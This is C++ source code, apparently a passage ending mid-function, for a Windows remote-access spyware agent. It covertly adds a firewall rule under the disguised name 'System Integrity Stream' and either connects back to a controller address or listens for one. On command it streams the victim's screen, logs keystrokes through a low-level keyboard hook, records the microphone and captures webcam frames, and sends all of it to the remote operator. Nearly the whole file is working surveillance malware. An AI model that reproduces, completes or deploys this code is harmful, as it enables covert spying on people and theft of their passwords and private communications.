#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <wincodec.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <atomic>
#include <fstream>
#include <cstdio>
#include <queue>
#include <mutex>
#include <mmsystem.h>
#include <mmdeviceapi.h>
#include <audioclient.h>
#include <audiopolicy.h>
#include <opencv2/opencv.hpp>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "opencv_world4120.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

const int TARGET_FPS = 30;
const float JPEG_QUALITY = 0.65f;
const int VIDEO_PORT = 443;
const int KEYLOG_PORT = 80;
const int HEARTBEAT_INTERVAL = 5000;
const int AUDIO_PORT = 8080;
const int AUDIO_SAMPLE_RATE = 44100;
const int AUDIO_CHANNELS = 2;
const int AUDIO_BITS_PER_SAMPLE = 16;
const int AUDIO_BUFFER_SIZE = 4096;

enum PacketType : uint8_t {
    PKT_HEARTBEAT = 0x01,
    PKT_HEARTBEAT_ACK = 0x02,
    PKT_VIDEO_FRAME = 0x03,
    PKT_KEYLOG_DATA = 0x04,
    PKT_COMMAND = 0x05,
    PKT_COMMAND_ACK = 0x06,
    PKT_AUDIO_DATA = 0x07,

    PKT_CAMERA_FRAME = 0x08

};

std::atomic<bool> g_running(false);
std::atomic<bool> g_stop_requested(false);
std::atomic<bool> g_video_streaming(false);
std::atomic<bool> g_keylogger_enabled(false);
std::atomic<DWORD> g_last_heartbeat_time(0);
std::atomic<bool> g_session_active(false);
std::atomic<bool> g_install_hook(false);

HANDLE g_captureThread = nullptr;
HANDLE g_videoControlThread = nullptr;
HANDLE g_keylogThread = nullptr;
HANDLE g_heartbeatThread = nullptr;
IWICImagingFactory* g_pFactory = nullptr;
SOCKET g_serverSocket = INVALID_SOCKET;
SOCKET g_clientSocket = INVALID_SOCKET;
SOCKET g_keylogServerSocket = INVALID_SOCKET;
SOCKET g_keylogClientSocket = INVALID_SOCKET;
std::atomic<bool> g_audio_recording(false);
HANDLE g_audioThread = nullptr;
HWAVEIN g_hWaveIn = nullptr;
WAVEHDR g_waveHdr[2];
std::mutex g_audioMutex;
std::string g_agentPath;
std::atomic<bool> g_camera_active(false);
HANDLE g_cameraThread = nullptr;

std::queue<std::string> g_keylogQueue;
std::mutex g_keylogMutex;
std::mutex g_socketMutex;
std::string g_callback_ip_mon = "";
int         g_callback_port_mon = 0;
HHOOK g_keyboardHook = nullptr;
DWORD WINAPI KeyloggerThread(LPVOID lpParam);
DWORD WINAPI VideoControlThread(LPVOID lpParam);
DWORD WINAPI HeartbeatThread(LPVOID lpParam);
DWORD WINAPI AudioRecordingThread(LPVOID lpParam);
DWORD WINAPI CameraCaptureThread(LPVOID lpParam);

void LogSilent(const std::string& message) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char debugBuffer[512];
    sprintf_s(debugBuffer, "[%02d:%02d:%02d] %s\n",
        st.wHour, st.wMinute, st.wSecond,
        message.c_str());
    OutputDebugStringA(debugBuffer);
}

std::string GetAgentExecutablePath() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    return std::string(exePath);
}

int RunSilentCommand(std::string cmd) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));

    std::vector<char> cmdBuffer(cmd.begin(), cmd.end());
    cmdBuffer.push_back(0);

    if (CreateProcessA(NULL, cmdBuffer.data(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {

        WaitForSingleObject(pi.hProcess, INFINITE);

        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return (int)exitCode;
    }
    return -1;
}

bool IsFirewallRuleExists(const std::string& ruleName) {
    std::string checkCmd = "netsh advfirewall firewall show rule name=\"" + ruleName + "\"";
    int result = RunSilentCommand(checkCmd);
    return (result == 0);
}

void EnsureFirewallException() {
    std::string ruleName = "System Integrity Stream";
    g_agentPath = GetAgentExecutablePath();

    if (IsFirewallRuleExists(ruleName)) {
        LogSilent("Firewall rule exists. Skipping.");
        return;
    }

    LogSilent("Adding firewall exception...");

    std::string addRuleCmd = "netsh advfirewall firewall add rule "
        "name=\"" + ruleName + "\" "
        "dir=in "
        "action=allow "
        "protocol=TCP "
        "localport=443,80 "
        "program=\"" + g_agentPath + "\" "
        "enable=yes";

    RunSilentCommand(addRuleCmd);
}

bool StartVideoServer();
bool WaitForClient();
bool ConnectToController() {

    if (!g_callback_ip_mon.empty() && g_callback_port_mon > 0) {
        LogSilent("Reverse mode — connecting to " + g_callback_ip_mon +
            ":" + std::to_string(g_callback_port_mon));

        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            LogSilent("WSAStartup failed");
            return false;
        }

        g_clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (g_clientSocket == INVALID_SOCKET) {
            WSACleanup();
            return false;
        }

        struct sockaddr_in ctrlAddr;
        ctrlAddr.sin_family = AF_INET;
        ctrlAddr.sin_addr.s_addr = inet_addr(g_callback_ip_mon.c_str());
        ctrlAddr.sin_port = htons((u_short)g_callback_port_mon);

        bool connected = false;
        for (int attempt = 0; attempt < 5 && !connected; attempt++) {
            if (attempt > 0) Sleep(1000);
            LogSilent("Connect attempt " + std::to_string(attempt + 1));
            if (connect(g_clientSocket,
                (struct sockaddr*)&ctrlAddr,
                sizeof(ctrlAddr)) == 0) {
                connected = true;
                LogSilent("Connected to controller");
            }
            else {
                LogSilent("Connect failed: " + std::to_string(WSAGetLastError()));
            }
        }

        if (!connected) {
            LogSilent("ERROR: Could not reach controller after 5 attempts");
            closesocket(g_clientSocket);
            g_clientSocket = INVALID_SOCKET;
            WSACleanup();
            return false;
        }

        g_serverSocket = INVALID_SOCKET;

    }

    else {

        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return false;

        g_serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (g_serverSocket == INVALID_SOCKET) {
            WSACleanup();
            return false;
        }

        int opt = 1;
        setsockopt(g_serverSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

        struct sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(VIDEO_PORT);

        if (bind(g_serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(g_serverSocket);
            WSACleanup();
            return false;
        }

        if (listen(g_serverSocket, 2) == SOCKET_ERROR) {
            closesocket(g_serverSocket);
            WSACleanup();
            return false;
        }

        DWORD timeout = 45000;
        setsockopt(g_serverSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

        struct sockaddr_in clientAddr;
        int clientAddrLen = sizeof(clientAddr);

        g_clientSocket = accept(g_serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
        if (g_clientSocket == INVALID_SOCKET) {
            LogSilent("Accept failed: " + std::to_string(WSAGetLastError()));
            closesocket(g_serverSocket);
            WSACleanup();
            return false;
        }

        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(clientAddr.sin_addr), clientIP, INET_ADDRSTRLEN);
        LogSilent("Client connected from: " + std::string(clientIP));
    }

    int flag = 1;
    setsockopt(g_clientSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&flag, sizeof(flag));

    int keepalive = 1;
    setsockopt(g_clientSocket, SOL_SOCKET, SO_KEEPALIVE, (char*)&keepalive, sizeof(keepalive));

    DWORD sndTimeout = 5000;
    setsockopt(g_clientSocket, SOL_SOCKET, SO_SNDTIMEO, (char*)&sndTimeout, sizeof(sndTimeout));

    int bufferSize = 256 * 1024;
    setsockopt(g_clientSocket, SOL_SOCKET, SO_SNDBUF, (char*)&bufferSize, sizeof(bufferSize));
    setsockopt(g_clientSocket, SOL_SOCKET, SO_RCVBUF, (char*)&bufferSize, sizeof(bufferSize));

    g_session_active = true;
    g_last_heartbeat_time = GetTickCount();

    LogSilent("ConnectToController: success");
    return true;
}


DWORD WINAPI HeartbeatThread(LPVOID lpParam) {
    LogSilent("Heartbeat thread started");

    while (g_running && !g_stop_requested && g_session_active) {
        Sleep(HEARTBEAT_INTERVAL);

        DWORD currentTime = GetTickCount();
        DWORD lastTime = g_last_heartbeat_time.load();

        if (currentTime - lastTime > (HEARTBEAT_INTERVAL * 3)) {
            LogSilent("Heartbeat timeout - connection lost");
            g_session_active = false;
            g_stop_requested = true;
            break;
        }

        std::lock_guard<std::mutex> lock(g_socketMutex);
        if (g_clientSocket != INVALID_SOCKET) {
            uint8_t heartbeat[5];
            heartbeat[0] = PKT_HEARTBEAT;
            uint32_t timestamp = htonl(currentTime);
            memcpy(&heartbeat[1], &timestamp, 4);

            int sent = send(g_clientSocket, (char*)heartbeat, 5, 0);
            if (sent != 5) {
                LogSilent("Failed to send heartbeat");
                g_session_active = false;
                g_stop_requested = true;
                break;
            }
        }
    }

    LogSilent("Heartbeat thread ended");
    return 0;
}

bool SendPacket(PacketType type, const std::vector<BYTE>& data) {
    if (g_clientSocket == INVALID_SOCKET || !g_session_active) {
        return false;
    }

    if (type == PKT_VIDEO_FRAME && !g_video_streaming) {
        return false;
    }

    std::lock_guard<std::mutex> lock(g_socketMutex);

    uint8_t header[5];
    header[0] = type;
    uint32_t size = htonl((uint32_t)data.size());
    memcpy(&header[1], &size, 4);

    int sent = 0;
    int retries = 0;
    while (sent < 5 && retries < 100) {
        int result = send(g_clientSocket, (char*)header + sent, 5 - sent, 0);

        if (result > 0) {
            sent += result;
        }
        else if (result == SOCKET_ERROR) {
            int err = WSAGetLastError();
            if (err == WSAEWOULDBLOCK) {

                Sleep(1);
                retries++;
                continue;
            }
            LogSilent("Send header error: " + std::to_string(err));
            return false;
        }
    }

    if (sent != 5) {
        LogSilent("Failed to send header completely");
        return false;
    }


    if (!data.empty()) {
        size_t totalSent = 0;
        retries = 0;

        while (totalSent < data.size() && retries < 1000) {
            int result = send(g_clientSocket, (char*)data.data() + totalSent,
                (int)(data.size() - totalSent), 0);

            if (result > 0) {
                totalSent += result;
            }
            else if (result == SOCKET_ERROR) {
                int err = WSAGetLastError();
                if (err == WSAEWOULDBLOCK) {
                    Sleep(1);
                    retries++;
                    continue;
                }
                LogSilent("Send data error: " + std::to_string(err));
                return false;
            }
        }

        if (totalSent != data.size()) {
            LogSilent("Failed to send data completely");
            return false;
        }
    }

    return true;
}


bool SendFrameTCP(const std::vector<BYTE>& frameData) {

    return SendPacket(PKT_VIDEO_FRAME, frameData);
}

bool SendKeylogData(const std::string& keyData) {
    if (!g_keylogger_enabled) return false;
    std::vector<BYTE> data(keyData.begin(), keyData.end());
    return SendPacket(PKT_KEYLOG_DATA, data);
}

bool InitializeWIC() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return false;

    hr = CoCreateInstance(CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER,
        IID_PPV_ARGS(&g_pFactory));
    return SUCCEEDED(hr);
}

bool CaptureFrameToJpeg(std::vector<BYTE>& outputData) {
    if (!g_pFactory) return false;

    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) return false;

    int screenWidth = GetDeviceCaps(hdcScreen, DESKTOPHORZRES);
    int screenHeight = GetDeviceCaps(hdcScreen, DESKTOPVERTRES);

    if (screenWidth <= 0 || screenHeight <= 0) {
        screenWidth = GetSystemMetrics(SM_CXSCREEN);
        screenHeight = GetSystemMetrics(SM_CYSCREEN);
    }

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    HGDIOBJ oldBmp = SelectObject(hdcMem, hbmScreen);

    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    bool success = false;
    IWICBitmap* pWicBitmap = nullptr;
    HRESULT hr = g_pFactory->CreateBitmapFromHBITMAP(hbmScreen, NULL, WICBitmapUseAlpha, &pWicBitmap);

    if (SUCCEEDED(hr)) {
        IStream* pStream = nullptr;
        if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
            IWICBitmapEncoder* pEncoder = nullptr;
            if (SUCCEEDED(g_pFactory->CreateEncoder(GUID_ContainerFormatJpeg, NULL, &pEncoder))) {
                pEncoder->Initialize(pStream, WICBitmapEncoderNoCache);

                IWICBitmapFrameEncode* pFrame = nullptr;
                IPropertyBag2* pPropertyBag = nullptr;

                if (SUCCEEDED(pEncoder->CreateNewFrame(&pFrame, &pPropertyBag))) {
                    PROPBAG2 option = { 0 };
                    option.pstrName = (LPOLESTR)L"ImageQuality";
                    VARIANT varValue;
                    VariantInit(&varValue);
                    varValue.vt = VT_R4;
                    varValue.fltVal = JPEG_QUALITY;

                    if (SUCCEEDED(pPropertyBag->Write(1, &option, &varValue))) {
                        pFrame->Initialize(pPropertyBag);
                        pFrame->SetSize(screenWidth, screenHeight);

                        WICRect rc = { 0, 0, screenWidth, screenHeight };
                        pFrame->WriteSource(pWicBitmap, &rc);
                        pFrame->Commit();
                        pEncoder->Commit();

                        STATSTG statstg;
                        pStream->Stat(&statstg, STATFLAG_NONAME);
                        size_t size = (size_t)statstg.cbSize.LowPart;
                        outputData.resize(size);

                        LARGE_INTEGER liPos = { 0 };
                        pStream->Seek(liPos, STREAM_SEEK_SET, NULL);
                        ULONG bytesRead;
                        pStream->Read(outputData.data(), (ULONG)size, &bytesRead);
                        success = true;
                    }
                    VariantClear(&varValue);
                    pFrame->Release();
                    pPropertyBag->Release();
                }
                pEncoder->Release();
            }
            pStream->Release();
        }
        pWicBitmap->Release();
    }

    SelectObject(hdcMem, oldBmp);
    DeleteObject(hbmScreen);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    return success;
}

std::string VKToString(DWORD vkCode, bool shiftPressed) {
    switch (vkCode) {
    case VK_BACK: return "[BACKSPACE]";
    case VK_RETURN: return "[ENTER]";
    case VK_SPACE: return " ";
    case VK_TAB: return "[TAB]";
    case VK_ESCAPE: return "[ESC]";
    case VK_DELETE: return "[DELETE]";
    case VK_HOME: return "[HOME]";
    case VK_END: return "[END]";
    case VK_PRIOR: return "[PGUP]";
    case VK_NEXT: return "[PGDN]";
    case VK_LEFT: return "[LEFT]";
    case VK_RIGHT: return "[RIGHT]";
    case VK_UP: return "[UP]";
    case VK_DOWN: return "[DOWN]";
    case VK_CAPITAL: return "[CAPS]";
    case VK_SHIFT: return "[SHIFT]";
    case VK_CONTROL: return "[CTRL]";
    case VK_MENU: return "[ALT]";
    case VK_LWIN:
    case VK_RWIN: return "[WIN]";
    }

    BYTE keyboardState[256];
    if (!GetKeyboardState(keyboardState)) {
        return "";
    }

    WCHAR buffer[5] = { 0 };
    int result = ToUnicode(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), keyboardState, buffer, 4, 0);

    if (result > 0) {
        char mbBuffer[10] = { 0 };
        WideCharToMultiByte(CP_UTF8, 0, buffer, result, mbBuffer, sizeof(mbBuffer), NULL, NULL);
        return std::string(mbBuffer);
    }

    return "";
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && g_keylogger_enabled) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = pKeyboard->vkCode;

            bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            std::string keyStr = VKToString(vkCode, shiftPressed);

            if (!keyStr.empty()) {
                std::lock_guard<std::mutex> lock(g_keylogMutex);
                g_keylogQueue.push(keyStr);
            }
        }
    }

    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}

DWORD WINAPI VideoControlThread(LPVOID lpParam) {
    LogSilent("Command processing thread started");


    u_long mode = 1;
    if (ioctlsocket(g_clientSocket, FIONBIO, &mode) != 0) {
        LogSilent("Failed to set socket to non-blocking: " + std::to_string(WSAGetLastError()));
    }

    while (g_running && !g_stop_requested && g_session_active) {

        fd_set readSet;
        FD_ZERO(&readSet);
        FD_SET(g_clientSocket, &readSet);

        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 100000;

        int selectResult = select(0, &readSet, NULL, NULL, &tv);

        if (selectResult == 0) {

            continue;
        }

        if (selectResult == SOCKET_ERROR) {
            LogSilent("Select error, exiting command thread: " + std::to_string(WSAGetLastError()));
            break;
        }


        uint8_t header[5];
        int received = recv(g_clientSocket, (char*)header, 5, 0);

        if (received == SOCKET_ERROR) {
            int err = WSAGetLastError();
            if (err == WSAEWOULDBLOCK) continue;
            LogSilent("Socket error during header recv: " + std::to_string(err));
            g_session_active = false;
            break;
        }

        if (received == 0) {
            LogSilent("Client disconnected gracefully");
            g_session_active = false;
            break;
        }

        if (received == 5) {
            PacketType type = (PacketType)header[0];
            uint32_t size = ntohl(*(uint32_t*)(&header[1]));

            if (type == PKT_HEARTBEAT_ACK) {
                g_last_heartbeat_time = GetTickCount();
                continue;
            }

            if (type == PKT_COMMAND && size > 0 && size < 1024) {
                std::vector<char> cmdBuffer(size + 1, 0);

                size_t totalReceived = 0;
                int retries = 0;
                const int maxRetries = 100; 

                while (totalReceived < size && retries < maxRetries) {
                    int chunk = recv(g_clientSocket, cmdBuffer.data() + totalReceived,
                        size - totalReceived, 0);

                    if (chunk > 0) {
                        totalReceived += chunk;
                    }
                    else if (chunk == SOCKET_ERROR) {
                        int err = WSAGetLastError();
                        if (err == WSAEWOULDBLOCK) {

                            Sleep(100);
                            retries++;
                            continue;
                        }
                        else {
                            LogSilent("Socket error during command recv: " + std::to_string(err));
                            g_session_active = false;
                            break;
                        }
                    }
                    else if (chunk == 0) {
                        LogSilent("Client closed connection during command receive");
                        g_session_active = false;
                        break;
                    }
                }

                if (totalReceived == size) {
                    std::string cmd(cmdBuffer.data(), size);
                    LogSilent("Received command: " + cmd);


                    if (cmd.find("START_STREAM") != std::string::npos) {
                        g_video_streaming = true;
                        LogSilent("Video streaming STARTED");
                        std::string ack = "STREAM_STARTED";
                        std::vector<BYTE> ackData(ack.begin(), ack.end());
                        SendPacket(PKT_COMMAND_ACK, ackData);
                    }

                    else if (cmd.find("STOP_STREAM") != std::string::npos) {
                        g_video_streaming = false;
                        LogSilent("Video streaming STOPPED");
                        std::string ack = "STREAM_STOPPED";
                        std::vector<BYTE> ackData(ack.begin(), ack.end());
                        SendPacket(PKT_COMMAND_ACK, ackData);
                    }

                    else if (cmd.find("START_AUDIO") != std::string::npos) {
                        if (g_audioThread) {
                            g_audio_recording = false;
                            WaitForSingleObject(g_audioThread, 2000);
                            CloseHandle(g_audioThread);
                            g_audioThread = nullptr;
                        }
                        g_audio_recording = true;
                        g_audioThread = CreateThread(NULL, 0, AudioRecordingThread, NULL, 0, NULL);

                        std::string status = g_audioThread ? "AUDIO_STARTED" : "AUDIO_FAILED";
                        std::vector<BYTE> ackData(status.begin(), status.end());
                        SendPacket(PKT_COMMAND_ACK, ackData);
                    }
                    else if (cmd.find("STOP_AUDIO") != std::string::npos) {
                        g_audio_recording = false;
                        if (g_audioThread) {
                            WaitForSingleObject(g_audioThread, 2000);
                            CloseHandle(g_audioThread);
                            g_audioThread = nullptr;
                        }
                        std::string ack = "AUDIO_STOPPED";
                        std::vector<BYTE> ackData(ack.begin(), ack.end());
                        SendPacket(PKT_COMMAND_ACK, ackData);
                    }

                    else if (cmd.find("START_CAMERA") != std::string::npos) {
                        if (g_cameraThread) {
                            g_camera_active = false;
                            WaitForSingleObject(g_cameraThread, 2000);
                            CloseHandle(g_cameraThread);
                            g_cameraThread = nullptr;
                        }
                        g_camera_active = true;
                        g_cameraThread = CreateThread(NULL, 0, CameraCaptureThread, NULL, 0, NULL);

                        std::string status = g_cameraThread ? "CAMERA_STARTED" : "CAMERA_FAILED";
                        std::vector<BYTE> ackData(status.begin(), status.end());
                        SendPacket(PKT_COMMAND_ACK, ackData);
                    }
                    else if (cmd.find("STOP_CAMERA") != std::string::npos) {
                        g_camera_active = false;
                        if (g_cameraThread) {
                            WaitForSingleObject(g_cameraThread, 2000);
                            CloseHandle(g_cameraThread);
                            g_cameraThread = nullptr;
                        }
                        std::string ack = "CAMERA_STOPPED";
                        std::vector<BYTE> ackData(ack.begin(), ack.end());
                        SendPacket(PKT_COMMAND_ACK, ackData);
                    }

                    else if (cmd.find("START_KEYLOG") != std::string::npos) {
                        if (g_keylogThread) {
                            g_keylogger_enabled = false;
                            g_install_hook = false;
                            WaitForSingleObject(g_keylogThread, 2000);
                            CloseHandle(g_keylogThread);
                            g_keylogThread = nullptr;
                        }
                        g_keylogger_enabled = true;
                        g_install_hook = true;
                        g_keylogThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);

                        std::string status = g_keylogThread ? "KEYLOG_READY" : "KEYLOG_FAILED";
                        std::vector<BYTE> ackData(status.begin(), status.end());
                        SendPacket(PKT_COMMAND_ACK, ackData);
                    }
                    else if (cmd.find("STOP_KEYLOG") != std::string::npos) {
                        g_keylogger_enabled = false;
                        g_install_hook = false;
                        if (g_keylogThread) {
                            WaitForSingleObject(g_keylogThread, 2000);
                            CloseHandle(g_keylogThread);
                            g_keylogThread = nullptr;
                        }
                        if (g_keyboardHook) {
                            UnhookWindowsHookEx(g_keyboardHook);
                            g_keyboardHook = nullptr;
                        }
                        std::string ack = "KEYLOG_STOPPED";
                        std::vector<BYTE> ackData(ack.begin(), ack.end());
                        SendPacket(PKT_COMMAND_ACK, ackData);
                    }

                    else if (cmd.find("CLOSE_SESSION") != std::string::npos) {
                        LogSilent("Session closing per operator request");
                        std::string ack = "SESSION_CLOSING";
                        std::vector<BYTE> ackData(ack.begin(), ack.end());
                        SendPacket(PKT_COMMAND_ACK, ackData);
                        g_session_active = false;
                        g_stop_requested = true;
                        break;
                    }
                }
                else {
                    LogSilent("Failed to receive full command body");
                }
            }
        }
    }

    LogSilent("Command processing thread ended");
    return 0;
}

DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    LogSilent("Keylogger processing thread started");

    if (g_install_hook) {
        g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc,
            GetModuleHandle(NULL), 0);

        if (g_keyboardHook) {
            LogSilent("Keyboard hook installed successfully");
        }
        else {
            LogSilent("ERROR: Failed to install keyboard hook");
            DWORD err = GetLastError();
            LogSilent("Error code: " + std::to_string(err));
        }

        g_install_hook = false;
    }

    MSG msg;
    while (g_running && g_session_active) {

        if (!g_keylogger_enabled) {
            break;
        }

        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) break;
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        {
            std::lock_guard<std::mutex> lock(g_keylogMutex);
            while (!g_keylogQueue.empty()) {
                std::string key = g_keylogQueue.front();
                g_keylogQueue.pop();

                if (!SendKeylogData(key)) {
                    LogSilent("Failed to send keylog data");
                    g_keylogger_enabled = false;
                    break;
                }
            }
        }

        Sleep(10);
    }

    if (g_keyboardHook) {
        UnhookWindowsHookEx(g_keyboardHook);
        g_keyboardHook = nullptr;
        LogSilent("Keyboard hook removed");
    }

    LogSilent("Keylogger processing thread ended");
    return 0;
}

void CALLBACK WaveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance,
    DWORD_PTR dwParam1, DWORD_PTR dwParam2) {
    if (uMsg == WIM_DATA && g_audio_recording) {
        WAVEHDR* pWaveHdr = (WAVEHDR*)dwParam1;

        if (pWaveHdr->dwBytesRecorded > 0) {
            std::vector<BYTE> audioData(pWaveHdr->lpData,
                pWaveHdr->lpData + pWaveHdr->dwBytesRecorded);

            if (!SendPacket(PKT_AUDIO_DATA, audioData)) {
                LogSilent("Failed to send audio data");
            }
        }

        waveInAddBuffer(hwi, pWaveHdr, sizeof(WAVEHDR));
    }
}

DWORD WINAPI AudioRecordingThread(LPVOID lpParam) {
    LogSilent("Audio recording thread started");

    WAVEFORMATEX wfx;
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = AUDIO_CHANNELS;
    wfx.nSamplesPerSec = AUDIO_SAMPLE_RATE;
    wfx.wBitsPerSample = AUDIO_BITS_PER_SAMPLE;
    wfx.nBlockAlign = (wfx.nChannels * wfx.wBitsPerSample) / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
    wfx.cbSize = 0;

    MMRESULT result = waveInOpen(&g_hWaveIn, WAVE_MAPPER, &wfx,
        (DWORD_PTR)WaveInProc, 0, CALLBACK_FUNCTION);

    if (result != MMSYSERR_NOERROR) {
        LogSilent("ERROR: Failed to open audio input device");
        return 1;
    }

    for (int i = 0; i < 2; i++) {
        g_waveHdr[i].lpData = new char[AUDIO_BUFFER_SIZE];
        g_waveHdr[i].dwBufferLength = AUDIO_BUFFER_SIZE;
        g_waveHdr[i].dwFlags = 0;

        waveInPrepareHeader(g_hWaveIn, &g_waveHdr[i], sizeof(WAVEHDR));
        waveInAddBuffer(g_hWaveIn, &g_waveHdr[i], sizeof(WAVEHDR));
    }

    waveInStart(g_hWaveIn);
    LogSilent("Audio recording started");

    while (g_audio_recording && g_session_active) {
        Sleep(100);
    }

    waveInStop(g_hWaveIn);
    waveInReset(g_hWaveIn);

    for (int i = 0; i < 2; i++) {
        waveInUnprepareHeader(g_hWaveIn, &g_waveHdr[i], sizeof(WAVEHDR));
        delete[] g_waveHdr[i].lpData;
    }

    waveInClose(g_hWaveIn);
    g_hWaveIn = nullptr;

    LogSilent("Audio recording thread ended");
    return 0;
}

DWORD WINAPI CameraCaptureThread(LPVOID lpParam) {
    LogSilent("Camera capture thread started");

    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    cv::VideoCapture camera(0);

    if (!camera.isOpened()) {
        LogSilent("ERROR: Failed to open camera");
        CoUninitialize();
        return 1;
    }

    camera.set(cv::CAP_PROP_FRAME_WIDTH, 640);
    camera.set(cv::CAP_PROP_FRAME_HEIGHT, 480);
    camera.set(cv::CAP_PROP_FPS, 15);

    LogSilent("Camera opened successfully");

    cv::Mat frame;
    std::vector<BYTE> jpegBuffer;
    std::vector<int> compressionParams;
    compressionParams.push_back(cv::IMWRITE_JPEG_QUALITY);
    compressionParams.push_back(70);

    int frameCount = 0;
    auto lastLogTime = std::chrono::steady_clock::now();

    while (g_camera_active && g_session_active) {
        if (!camera.read(frame) || frame.empty()) {
            LogSilent("ERROR: Failed to capture camera frame");
            Sleep(100);
            continue;
        }

        jpegBuffer.clear();
        if (cv::imencode(".jpg", frame, jpegBuffer, compressionParams)) {
            if (!SendPacket(PKT_CAMERA_FRAME, jpegBuffer)) {
                LogSilent("Failed to send camera frame");
                break;
            }

            frameCount++;

            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastLogTime).count();
            if (elapsed >= 5) {
                LogSilent("Camera: " + std::to_string(frameCount) + " frames sent");
                frameCount = 0;
                lastLogTime = now;
            }
        }

        Sleep(66);

    }

    camera.release();
    CoUninitialize();

    LogSilent("Camera capture thread ended");
    return 0;
}

DWORD WINAPI CaptureThread(LPVOID lpParam) {
    if (!InitializeWIC()) return 1;
    EnsureFirewallException();

    if (!ConnectToController()) return 1;

    LogSilent("Connection established, starting control and heartbeat threads");

    g_videoControlThread = CreateThread(NULL, 0, VideoControlThread, NULL, 0, NULL);
    g_heartbeatThread = CreateThread(NULL, 0, HeartbeatThread, NULL, 0, NULL);

    int frameDelay = 1000 / TARGET_FPS;
    int frameCount = 0;
    auto lastLogTime = std::chrono::steady_clock::now();

    LogSilent("Entering main capture loop");

    while (g_running && !g_stop_requested && g_session_active) {
        auto frameStart = std::chrono::steady_clock::now();

        if (g_video_streaming) {
            std::vector<BYTE> jpegData;
            if (CaptureFrameToJpeg(jpegData)) {
                if (!SendFrameTCP(jpegData)) {
                    if (!g_session_active) {
                        LogSilent("Connection lost, exiting capture loop");
                        break;
                    }
                }
                else {
                    frameCount++;
                    auto now = std::chrono::steady_clock::now();
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                        now - lastLogTime).count();
                    if (elapsed >= 5) {
                        LogSilent("Streaming: " + std::to_string(frameCount) +
                            " frames sent");
                        frameCount = 0;
                        lastLogTime = now;
                    }
                }
            }
        }

        auto frameEnd = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            frameEnd - frameStart).count();
        int sleepTime = frameDelay - (int)elapsed;
        Sleep(sleepTime > 0 ? sleepTime : 1);
    }

    LogSilent("Capture loop ended. Total frames: " + std::to_string(frameCount));

    g_session_active = false;
    g_keylogger_enabled = false;
    g_video_streaming = false;

    if (g_keyboardHook) {
        UnhookWindowsHookEx(g_keyboardHook);
        g_keyboardHook = nullptr;
    }
